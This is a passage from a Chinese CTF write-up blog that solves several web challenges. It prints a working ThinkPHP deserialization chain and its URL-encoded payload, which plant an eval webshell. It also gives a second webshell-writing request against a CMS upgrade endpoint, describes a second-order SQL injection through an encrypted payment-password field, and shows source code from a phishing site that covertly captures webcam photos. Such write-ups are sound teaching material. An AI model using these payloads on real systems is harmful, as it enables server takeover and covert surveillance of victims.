&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>&lt;span style="color:#75715e">// $value值，作为call函数引用的第二变量
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\db&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Query&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;model=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Output&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$styles&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">styles&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;getAttr&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\session\driver\Memcached
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\session\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcached&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handler&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\cache\driver\File
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\cache\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">File&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$tag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;expire&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3600&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;cache_subdir&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;prefix&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;data_compress&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$Memcached&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\session\driver\Memcached&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\think\cache\driver\File&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$Output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\console\Output&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Memcached&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\db\Query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$HasOne&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\relation\HasOne&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$window&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\process\pipes\Windows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">think\model\Pivot&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$Output&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$HasOne&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$window&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上传&lt;/p>
&lt;pre>&lt;code>/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
&lt;/code>&lt;/pre>&lt;p>虽然会返回一个报错的页面，但是可以在&lt;code>/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php&lt;/code>处验证一下是否写上了🐎，文件名字是&lt;code>md5('tag_'.md5($this-&amp;gt;tag))&lt;/code>，连接密码是ccc 直接蚁剑&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804202819779.png" alt="image-20210804202819779">&lt;/p>
&lt;p>在&lt;a href="http://www.snowywar.top/?p=2424">雪殇的wp&lt;/a>中用的是另一个，更直接的写🐎方式，下面说一下思路（大概&lt;/p>
&lt;p>我们可以先尝试看看敏感函数file_put_contents()是否能利用&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212231467.png" alt="image-20210804212231467">&lt;/p>
&lt;p>在&lt;code>application/admin/controller/Upgrade.php&lt;/code>下看到了文件写入的函数，它位于在&lt;code>writelog()&lt;/code>中，这个函数的功能是处理post请求传入的各项参数&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804212743633.png" alt="image-20210804212743633">&lt;/p>
&lt;p>这个&lt;code>config('client_upgrade_edition')&lt;/code>捏，跟了一下 它会返回null，再往上看到&lt;code>_initialize()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805140607537.png" alt="image-20210805140607537">&lt;/p>
&lt;p>所以最后是会将$upgrade_edition写入中&lt;code>/runtime/client_upgrade_edtion.php&lt;/code>中；而整个writelog()函数会被sysup()调用&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804213858768.png" alt="image-20210804213858768">&lt;/p>
&lt;p>跟进这个sysup()和$upgrade_edtion，看是否可用+如何用&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220616726.png" alt="image-20210804220616726">&lt;/p>
&lt;p>在&lt;code>template/admin_style/default/admin/upgrade/index.htm&lt;/code>下看到了确实存在的路由，这个的页面是在后台管理中心 - 系统功能 - 系统在线升级处，随便升一个看看&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804214721944.png" alt="image-20210804214721944">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804215658734.png" alt="image-20210804215658734">&lt;/p>
&lt;p>抓包之后看到这里确实有post访问和upgrade_edtion参数，那就稳了，直接写🐎&lt;/p>
&lt;pre>&lt;code>/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E//
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804220302331.png" alt="image-20210804220302331">&lt;/p>
&lt;p>将🐎写进的目标页面&lt;code>/runtime/client_upgrade_edition.php&lt;/code>连入蚁剑 拿flag即可&lt;/p>
&lt;p>————比赛的时候我其实是没有搜到&lt;a href="https://ma4ter.cn/2527.html">齐博建站系统x1.0代码审计&lt;/a>这篇的，当时思路是在后台在找有没有可以利用的地方直接写🐎 ，当时找的是独立页管理，尝试upload，但是并不太行（也可能是我太菜了），然后也没去审代码（懒狗）所以 就没出这个题，现在看还是疏忽了 确实完全没注意到系统在线升级这个模块是可用的 也没有认真的分析源码 我的过&lt;/p>
&lt;h2 id="安全安全还是xxx的安全">安全,安全,还是xxx的安全&lt;/h2>
&lt;blockquote>
&lt;p>某个特别安全的商店&lt;/p>
&lt;p>Hint:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;users&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span> &lt;span style="color:#00a8c8">NOT&lt;/span> &lt;span style="color:#00a8c8">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span> &lt;span style="color:#00a8c8">UNIQUE&lt;/span> &lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;login_password&amp;#34;&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;money&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;pay_password&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flag_num&amp;#34;&lt;/span> &lt;span style="color:#111">INTEGER&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#00a8c8">PRIMARY&lt;/span> &lt;span style="color:#00a8c8">KEY&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">CREATE&lt;/span> &lt;span style="color:#00a8c8">TABLE&lt;/span> &lt;span style="color:#d88200">&amp;#34;flaaaaaaaaag&amp;#34;&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;flllllllag&amp;#34;&lt;/span> &lt;span style="color:#111">TEXT&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>特别简陋的前端，有登录和注册和主页三个页面，登录处有一定过滤 存在sqli&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133701306.png" alt="image-20210801133701306">&lt;/p>
&lt;p>任意注册账号，走一波流程&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133748445.png" alt="image-20210801133748445">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133808970.png" alt="image-20210801133808970">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801133825487.png" alt="image-20210801133825487">&lt;/p>
&lt;p>&lt;del>😅蚌埠住了&lt;/del>&lt;/p>
&lt;p>回过头来看一下Burp对刚才操作的抓包结果，从cookie可以知道后端是flask框架 ，flask的话一般标配sqlite数据库，然后看下页面源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805142343684.png" alt="image-20210805142343684">&lt;/p>
&lt;p>注册时用post提交信息，密码部分用的是&lt;code>md5(app.users.password+'CBCTF')&lt;/code>，支付密码是&lt;code>encrsa(app.users.pay_password)&lt;/code>，好家伙 这个加密 pay_password部分md5+rsa+b64&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>————比赛的时候基本就停到这里了，感觉是sqli 但是不知道怎么注 全是md5的，以下是参考&lt;a href="https://www.cnblogs.com/erR0Ratao/p/15088223.html">wp&lt;/a>之后的复现&lt;/p>
&lt;p>赛后讲题的时候 出题师傅说参考的是这一篇文章&lt;a href="http://cache.baiducontent.com/c?m=DKJpowjfS-VrxBDrvlkdWFgbk_gnjyP0HEBWJljdQEQ9V3LlYgD1_bfav9DjmFclDejSpHzx5A9kyWFfTVUYm0bX6pNmtyBsxwPjYx-C3KRb_L2YzCoKogiCFXWcyV80EQ5dcXMLFlkbGHr_-te4xQbrgVm2Sd2UKx-_aXSrxQZ-IEBexIZkQCHg53QbTNdTQkH1IHgj_ozoB9uq12JYdR54wSPrMDwCK9QMq-qhRNa&amp;amp;p=8734d15e8cd012a05abd9b7d0c1093&amp;amp;newp=8478c915d9c040a911a2c7710f0588231610db2151d6d1126b82c825d7331b001c3bbfb423291b07d6c27a6c01aa485ae9f23073330923a3dda5c91d9fb4c57479c168&amp;amp;s=cfcd208495d565ef&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=%CA%FD%BE%DD%BC%D3%C3%DC%BB%F2%B3%C9WAF%CA%A7%D0%A7%D7%EE%B4%F3%D4%AA%D0%D7&amp;amp;qid=e0c153e70004188f&amp;amp;p1=1">数据加密或成WAF失效最大元凶…&lt;/a>（原帖被404了 只有个快照 还是百度快照才能看 而且没图）核心是这一段&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805151726564.png" alt="image-20210805151726564">&lt;/p>
&lt;p>这个题的flag购买小站，对pay_password是进行前端md5+rsa+b64加密，后端再对应着拿私钥解密，存入数据库的是md5值，看似很完美 但是其实根本没有waf的介入 没有对参数进行任何过滤，如果我们从中间介入 只保留rsa+b64的部分 就可以任意控制参数达到二次注入的效果&lt;/p>
&lt;p>公钥在网页源码中已经给出，数据表的结果也已经在Hint中了，用cyberchef一把梭&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805153732476.png" alt="image-20210805153732476">&lt;/p>
&lt;p>重新注册个账号，只修改一下username即可 passwd不用变 将pay_password修改为上面生成的值，登陆后即可看到flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210805152706585.png" alt="image-20210805152706585">&lt;/p>
&lt;h2 id="jjs-camera">jj&amp;rsquo;s camera&lt;/h2>
&lt;blockquote>
&lt;p>jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点&lt;/p>
&lt;p>Hint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应&lt;/p>
&lt;/blockquote>
&lt;p>也是已有的东西 但是比赛的时候我没搜到源码（尴尬）源码在这里：&lt;a href="https://www.heibai.org/post/2002.html">在吗宝贝？你点开这个网址看看[打开网站偷拍照片]&lt;/a> | &lt;a href="https://www.heibai.org/post/1630.html">点开一个网址我被记录了ip还偷拍了照片&lt;/a>&lt;/p>
&lt;p>（我这个智商真的是负数起步的 上面这两个帖子我看了好久 才反应过来这个钓鱼网站是要干啥。。。。&lt;/p>
&lt;p>前端是一个链接生成站 中间可以加一个id的参数，访问后会自动调用摄像头（但是会有个提示的弹窗），先拍照再相应链接，之后可以到先前的页面查看拍到的照片，数据以post的形式上传至/qbl.php?id=xxx&amp;amp;url=xxx，这是qbl.php的源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$base64_img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;img&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">$up_dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;./img/&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">//存放在当前目录的img文件夹下
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0777&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^(data:\s*image\/(\w+);base64,)/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#111">$type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;bmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;png&amp;#39;&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;span style="color:#111">$new_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$up_dir&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$id&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;_&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">date&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;mdHis_&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$type&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$new_file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$base64_img&lt;/span>&lt;span style="color:#111">)));&lt;/span>
